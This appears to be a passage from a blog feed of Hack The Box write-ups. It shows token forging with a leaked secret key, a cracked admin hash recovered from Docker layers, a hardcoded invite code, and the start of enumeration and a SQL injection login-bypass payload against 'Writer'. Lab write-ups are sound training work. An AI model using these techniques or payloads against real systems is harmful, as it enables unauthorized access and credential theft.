<span style="color:#bd93f9">2</span><span style="color:#ff79c6">|</span>AAAA<span style="color:#ff79c6">|</span>a<span style="color:#ff79c6">@</span>a.a<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$cArj<span style="color:#ff79c6">/</span><span style="color:#bd93f9">7</span>IZ$zFaX0xwzA1d0AEPMguFA7.<span style="color:#ff79c6">||</span>BBBB
sqlite<span style="color:#ff79c6">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Looking at source code <strong>config.py</strong>, we find at row 14:</p>
<pre><code>SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')
</code></pre>
<p>This secret key is used in <strong>app/home/routes.py</strong> at row 16 to serialize strings:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#ff79c6">..</span>]
<span style="color:#ff79c6">from</span> itsdangerous <span style="color:#ff79c6">import</span> URLSafeTimedSerializer
[<span style="color:#ff79c6">..</span>]
ts <span style="color:#ff79c6">=</span> URLSafeTimedSerializer(app<span style="color:#ff79c6">.</span>config[<span style="color:#f1fa8c">&#34;SECRET_KEY&#34;</span>])
</code></pre></td></tr></table>
</div>
</div><p>from this file, new routes we did not identify with gobuster can be explored.</p>
<table>
<thead>
<tr>
<th>route</th>
<th>login required</th>
</tr>
</thead>
<tbody>
<tr>
<td>/<!-- raw HTML omitted --></td>
<td>Yes</td>
</tr>
<tr>
<td>/example-profile</td>
<td>No</td>
</tr>
<tr>
<td>/confirm/changes/<!-- raw HTML omitted --></td>
<td>No</td>
</tr>
</tbody>
</table>
<p>The last route is interesting because we have the source code to create a token for a specific user as well as retrieve the username or email that has been safely tokenized:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">@blueprint<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/confirm/changes/&lt;token&gt;&#39;</span>)
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">confirm_changes</span>(token):
    <span style="color:#f1fa8c">&#34;&#34;&#34;Confirmation Token&#34;&#34;&#34;</span>
    <span style="color:#ff79c6">try</span>:
        email <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>loads(token, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;changes-confirm-key&#34;</span>, max_age<span style="color:#ff79c6">=</span><span style="color:#bd93f9">86400</span>)
    <span style="color:#ff79c6">except</span>:
        abort(<span style="color:#bd93f9">404</span>)
    user <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">.</span>query<span style="color:#ff79c6">.</span>filter_by(username<span style="color:#ff79c6">=</span>email)<span style="color:#ff79c6">.</span>first_or_404()
    name <span style="color:#ff79c6">=</span> user<span style="color:#ff79c6">.</span>profile_update
    template <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;templates/emails/update-name.html&#39;</span>, <span style="color:#f1fa8c">&#39;r&#39;</span>)<span style="color:#ff79c6">.</span>read()
    msg <span style="color:#ff79c6">=</span> Message(
            recipients<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>user<span style="color:#ff79c6">.</span>email<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>],
            sender <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;support@example.com&#39;</span>,
            reply_to <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;support@example.com&#39;</span>,
            subject <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Your profile changes have been confirmed.&#34;</span>
        )
    msg<span style="color:#ff79c6">.</span>html <span style="color:#ff79c6">=</span> render_template_string(template <span style="color:#ff79c6">%</span> name)
    mail<span style="color:#ff79c6">.</span>send(msg)
                                                                                                                                                                  <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;index.html&#39;</span>)
</code></pre></td></tr></table>
</div>
</div><p>With a bit of luck, the secret and the salt are the same in the Production system. As an example for user <strong>admin</strong>:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">$ python3
Python <span style="color:#bd93f9">3.8.2</span> (default, Jul <span style="color:#bd93f9">16</span> <span style="color:#bd93f9">2020</span>, <span style="color:#bd93f9">14</span>:<span style="color:#bd93f9">00</span>:<span style="color:#bd93f9">26</span>)
[GCC <span style="color:#bd93f9">9.3.0</span>] on linux
Type <span style="color:#f1fa8c">&#34;help&#34;</span>, <span style="color:#f1fa8c">&#34;copyright&#34;</span>, <span style="color:#f1fa8c">&#34;credits&#34;</span> <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#34;license&#34;</span> <span style="color:#ff79c6">for</span> more information<span style="color:#ff79c6">.</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">from</span> itsdangerous <span style="color:#ff79c6">import</span> URLSafeTimedSerializer
<span style="color:#ff79c6">&gt;&gt;&gt;</span> ts <span style="color:#ff79c6">=</span> URLSafeTimedSerializer(<span style="color:#f1fa8c">&#39;S#perS3crEt_007&#39;</span>)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> user <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;admin&#39;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> token <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>dumps(user, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;changes-confirm-key&#39;</span>)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> token
<span style="color:#f1fa8c">&#39;ImFkbWluIg.YX5vNQ.qIo6-iaPzlnFFdosQeQTfgez7zo&#39;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> email <span style="color:#ff79c6">=</span> ts<span style="color:#ff79c6">.</span>loads(token, salt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;changes-confirm-key&#34;</span>, max_age<span style="color:#ff79c6">=</span><span style="color:#bd93f9">86400</span>)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> email
<span style="color:#f1fa8c">&#39;admin&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>The attempt miserably fail because the URLSafeTimedSerializer is not using the same Time signature as the server.</p>
<pre><code>itsdangerous.exc.BadTimeSignature: Signature b&quot;qIo6-iaPzlnFFdosQeQTfgez7zo'&quot; does not match
</code></pre>
<p>I still want to validate the approach of resetting the admin password, so maybe</p>
<h2 id="exploring-docker-layers">Exploring docker layers</h2>
<p>Is it possible there is some more findings on the volume layers? <a href="https://github.com/wagoodman/dive">Dive</a> is a great tool to explore container volume layers and visualize Added/Removed/Modified/Unmodified files.</p>
<table>
<thead>
<tr>
<th>layer</th>
<th>added / removed / modified files</th>
</tr>
</thead>
<tbody>
<tr>
<td>187e74</td>
<td>FROM <!-- raw HTML omitted --></td>
</tr>
<tr>
<td>745959</td>
<td>COPY .env config.py run.py gunicorn-cfg.py requirements.txt</td>
</tr>
<tr>
<td>410934</td>
<td>COPY ./app/</td>
</tr>
<tr>
<td>a4ea7d</td>
<td>New file db.sqlite3</td>
</tr>
<tr>
<td>304986</td>
<td>Removed db.sqlite3 base/forms.py base/routes.py base/[..]/register.html</td>
</tr>
</tbody>
</table>
<p>Exploring the deleted db.sqlite3 reveals admin hash</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">[I] ➜ sqlite3
SQLite <span style="color:#ff79c6">version</span> <span style="color:#bd93f9">3</span>.<span style="color:#bd93f9">28</span>.<span style="color:#bd93f9">0</span> <span style="color:#bd93f9">2019</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span> <span style="color:#bd93f9">19</span>:<span style="color:#bd93f9">49</span>:<span style="color:#bd93f9">53</span>
Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">usage</span> hints.
Connected <span style="color:#ff79c6">to</span> a transient <span style="color:#ff79c6">in</span><span style="color:#ff79c6">-</span>memory <span style="color:#ff79c6">database</span>.
Use <span style="color:#f1fa8c">&#34;.open FILENAME&#34;</span> <span style="color:#ff79c6">to</span> reopen <span style="color:#ff79c6">on</span> a persistent <span style="color:#ff79c6">database</span>.
sqlite<span style="color:#ff79c6">&gt;</span> attach <span style="color:#f1fa8c">&#34;db.sqlite3&#34;</span> <span style="color:#ff79c6">as</span> db
...<span style="color:#ff79c6">&gt;</span> ;
sqlite<span style="color:#ff79c6">&gt;</span> .databases;
Error: <span style="color:#ff79c6">unknown</span> command <span style="color:#ff79c6">or</span> invalid arguments: <span style="color:#f1fa8c">&#34;databases;&#34;</span>. Enter <span style="color:#f1fa8c">&#34;.help&#34;</span> <span style="color:#ff79c6">for</span> help
sqlite<span style="color:#ff79c6">&gt;</span> .databases
main:
db: <span style="color:#ff79c6">/</span>private<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>bolt<span style="color:#ff79c6">/</span>a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2<span style="color:#ff79c6">/</span>db.sqlite3
sqlite<span style="color:#ff79c6">&gt;</span> .tables
db.<span style="color:#ff79c6">User</span>
sqlite<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> \<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">from</span> db.<span style="color:#ff79c6">User</span>
...<span style="color:#ff79c6">&gt;</span> ;
<span style="color:#bd93f9">1</span><span style="color:#ff79c6">|</span><span style="color:#ff79c6">admin</span><span style="color:#ff79c6">|</span><span style="color:#ff79c6">admin</span><span style="color:#ff79c6">@</span>bolt.htb<span style="color:#ff79c6">|</span>$<span style="color:#bd93f9">1</span>$sm1RceCh$rSd3PygnS<span style="color:#ff79c6">/</span><span style="color:#bd93f9">6</span>jlFDfF2J5q.<span style="color:#ff79c6">||</span>
sqlite<span style="color:#ff79c6">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><pre><code>hashcat -m 500 ~/hashes.txt /opt/dictionaries/rockyou.txt --force
[..]
hashcat -m 500 ~/hashes.txt /opt/dictionaries/rockyou.txt --show
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
</code></pre>
<p>We can indeed successfully login with admin:deadbolt and a chat conversation reveals the demo is restricted to invite only. Looking at deleted file /app/base/routes.py we can find the invitation code, if the use does not exist and the email is not registered then it will be created :)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">@blueprint<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/register&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">register</span>():
    login_form <span style="color:#ff79c6">=</span> LoginForm(request<span style="color:#ff79c6">.</span>form)
    create_account_form <span style="color:#ff79c6">=</span> CreateAccountForm(request<span style="color:#ff79c6">.</span>form)
    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;register&#39;</span> <span style="color:#ff79c6">in</span> request<span style="color:#ff79c6">.</span>form:

        username  <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;username&#39;</span>]
        email     <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;email&#39;</span>   ]
        code	  <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;invite_code&#39;</span>]
        <span style="color:#ff79c6">if</span> code <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span>:
            <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;code-500.html&#39;</span>)
        data <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">.</span>query<span style="color:#ff79c6">.</span>filter_by(email<span style="color:#ff79c6">=</span>email)<span style="color:#ff79c6">.</span>first()
        <span style="color:#ff79c6">if</span> data <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span> <span style="color:#ff79c6">and</span> code <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span>:
            [<span style="color:#ff79c6">..</span>]
            <span style="color:#6272a4"># else we can create the user</span>
            user <span style="color:#ff79c6">=</span> User(<span style="color:#ff79c6">**</span>request<span style="color:#ff79c6">.</span>form)
            db<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>add(user)
            db<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>commit()
</code></pre></td></tr></table>
</div>
</div><p>But registration still does not work:</p>
<pre tabindex="0"><code>POST /register HTTP/1.1
Host: bolt.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://bolt.htb
Connection: close
Referer: http://bolt.htb/register
Upgrade-Insecure-Requests: 1

username=aaaa&amp;email=a%40a.a&amp;password=aaaaaaaa&amp;invite_code=XNSS-HSJW-3NGU-8XTJ
</code></pre><p>Looking at the deleted forms.py, we can see the form&rsquo;s input are different:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">CreateAccountForm</span>(FlaskForm):
    username <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Username&#39;</span>     , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;username_create&#39;</span> , validators<span style="color:#ff79c6">=</span>[DataRequired()])
    email    <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Email&#39;</span>        , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;email_create&#39;</span>    , validators<span style="color:#ff79c6">=</span>[DataRequired(), Email()])
    password <span style="color:#ff79c6">=</span> PasswordField(<span style="color:#f1fa8c">&#39;Password&#39;</span> , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;pwd_create&#39;</span>      , validators<span style="color:#ff79c6">=</span>[DataRequired()])
    invite_code <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Invite Code&#39;</span>, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;invite_code&#39;</span>    , validators<span style="color:#ff79c6">=</span>[DataRequired()])
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>Htb Writer</title><link>https://0xade1.github.io/posts/2021/10/htb-writer/</link><pubDate>Tue, 26 Oct 2021 01:37:15 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-writer/</guid><description>Enumeration rustscan -a 10.10.11.101 -t 2000 -- -Pn -A -sCV Open 10.10.11.101:22 Open 10.10.11.101:80 Open 10.10.11.101:139 Open 10.10.11.101:445 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Story Bank | Writer.HTB 139/tcp open netbios-ssn syn-ack Samba smbd 4.6.2 445/tcp open netbios-ssn syn-ack Samba smbd 4.</description><content type="html"><![CDATA[<h2 id="enumeration">Enumeration</h2>
<pre><code>rustscan -a  10.10.11.101 -t 2000  -- -Pn -A -sCV
Open 10.10.11.101:22
Open 10.10.11.101:80
Open 10.10.11.101:139
Open 10.10.11.101:445
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>Web enumeration:</p>
<pre><code>gobuster dir -u http://writer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30
/contact (Status: 200)
/logout (Status: 302)
/about (Status: 200)
/static (Status: 301)
/dashboard (Status: 302)
/server-status (Status: 403)
/administrative (Status: 200)
</code></pre>
<p>Smb exploration:</p>
<pre><code>smbmap -H 10.10.11.101
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.11.101...
[+] IP: 10.10.11.101:445        Name: writer.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        writer2_project                                         NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))
</code></pre>
<p><a href="https://github.com/CiscoCXSecurity/enum4linux">enum4linux</a> is a Perl wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>
<pre><code>./enum4linux.pl -a 10.10.11.101
[..]
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kyle (Local User)
S-1-22-1-1001 Unix User\john (Local User)
</code></pre>
<h2 id="sql-injection">SQL Injection</h2>
<p>On the /administrative page we find a login form. We identify a SQL Injection vulnerability on the username. Upon successful exploitation We are redirected to a dashboard.</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>cleartext</td>
<td>uname=test' or 1=1; &ndash; -</td>
</tr>
<tr>
<td>urlencoded</td>
<td>uname=test'+or+1%3d1%3b+&ndash;+-</td>
</tr>
</tbody>
</table>
<p>FFUFF is much faster at finding SQL Injections; I first need to capture with Burp the POST requests into a text file:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
